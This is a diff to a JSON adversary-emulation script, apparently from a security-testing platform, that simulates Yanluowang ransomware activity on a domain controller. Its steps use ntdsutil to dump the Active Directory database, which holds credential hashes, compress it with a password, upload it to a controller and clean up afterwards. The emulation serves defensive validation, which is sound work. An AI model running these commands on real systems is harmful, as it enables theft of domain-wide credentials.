@@ -7,53 +7,58 @@
         "operating_system_name": "windows",
         "script": {
             "0": {
-                "conf": "--cp 192.168.134.150:443 --multipart 10240 --secure true",
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
                 "module": "https",
                 "type": "initialization"
             },
             "1": {
+                "name": "REQUIRES",
+                "type": "assign",
+                "value": "DOMAIN CONTROLLER, LOCAL ADMIN"
+            },
+            "2": {
                 "module": "loader",
                 "module_to_load": "run",
                 "request": "--load run",
                 "type": "message"
             },
-            "2": {
+            "3": {
                 "module": "loader",
                 "module_to_load": "uploader",
                 "request": "--load uploader",
                 "type": "message"
             },
-            "3": {
+            "4": {
                 "module": "loader",
                 "module_to_load": "downloader",
                 "request": "--load downloader",
                 "type": "message"
             },
-            "4": {
+            "5": {
                 "name": "OVERVIEW",
                 "type": "assign",
                 "value": "This emulation is designed to emulate the behavior observed with Yanlouwang ransomware utilizing ntdsutil. This emulation must be run in privileged mode on a machine where ntdsutil.exe is present (usually a domain controller)."
             },
-            "5": {
+            "6": {
                 "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
                 "module": "controller",
                 "request": "--integrity",
                 "type": "message"
             },
-            "6": {
+            "7": {
                 "name": "ECHO",
                 "type": "assign",
                 "value": "If the controller is not running in high integrity mode (see last command) the emulation will terminate."
             },
-            "7": {
+            "8": {
                 "function": "ifelse",
-                "next": "25",
-                "step": "5",
+                "next": "26",
+                "step": "6",
                 "type": "decision",
                 "value": "High",
                 "verb": "does not contain"
             },
-            "8": {
+            "9": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c dir C:\\windows\\system32\\ntdsutil.exe",
@@ -62,20 +67,20 @@
                 ],
                 "type": "message"
             },
-            "9": {
+            "10": {
                 "function": "ifelse",
-                "next": "25",
-                "step": "8",
+                "next": "26",
+                "step": "9",
                 "type": "decision",
                 "value": "Incorrect function",
                 "verb": "contains"
             },
-            "10": {
+            "11": {
                 "name": "ECHO",
                 "type": "assign",
                 "value": "ntdsutil.exe not found on the target, terminating the emulation."
             },
-            "11": {
+            "12": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c dir /s c:\\users\\public\\z",
@@ -84,7 +89,7 @@
                 ],
                 "type": "message"
             },
-            "12": {
+            "13": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c mkdir C:\\users\\public\\z",
@@ -93,7 +98,7 @@
                 ],
                 "type": "message"
             },
-            "13": {
+            "14": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell ntdsutil.exe 'ac i NTDS' 'ifm' 'create full c:\\users\\public\\z' q q",
@@ -103,7 +108,7 @@
                 ],
                 "type": "message"
             },
-            "14": {
+            "15": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
                 "request": "--src VFS://shared/threats/common_x64/7za.exe --dest C:\\users\\public\\7za.exe --overwrite",
@@ -112,7 +117,7 @@
                 ],
                 "type": "message"
             },
-            "15": {
+            "16": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "c:\\users\\public\\7za.exe a -palfalfarulz C:\\users\\public\\z.7z C:\\users\\public\\z",
@@ -121,7 +126,7 @@
                 ],
                 "type": "message"
             },
-            "16": {
+            "17": {
                 "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
                 "module": "uploader",
                 "request": "--remotepath C:\\users\\public\\z.7z",
@@ -130,12 +135,12 @@
                 ],
                 "type": "message"
             },
-            "17": {
+            "18": {
                 "name": "ECHO",
                 "type": "assign",
                 "value": "Begin cleanup"
             },
-            "18": {
+            "19": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c del C:\\users\\public\\7za.exe",
@@ -144,7 +149,7 @@
                 ],
                 "type": "message"
             },
-            "19": {
+            "20": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c del C:\\users\\public\\z.7z",
@@ -153,7 +158,7 @@
                 ],
                 "type": "message"
             },
-            "20": {
+            "21": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c rmdir /q /s C:\\users\\public\\z\\registry",
@@ -162,7 +167,7 @@
                 ],
                 "type": "message"
             },
-            "21": {
+            "22": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c rmdir /q /s \"C:\\users\\public\\z\\Active Directory\"",
@@ -171,15 +176,15 @@
                 ],
                 "type": "message"
             },
-            "22": {
+            "23": {
                 "function": "ifelse",
-                "next": "25",
-                "step": "11",
+                "next": "26",
+                "step": "12",
                 "type": "decision",
                 "value": "Incorrect function",
                 "verb": "does not contain"
             },
-            "23": {
+            "24": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "rmdir /s /q c:\\users\\public\\z",
@@ -188,7 +193,7 @@
                 ],
                 "type": "message"
             },
-            "24": {
+            "25": {
                 "name": "ECHO",
                 "type": "assign",
                 "value": "Removing the staging directory since we created it."
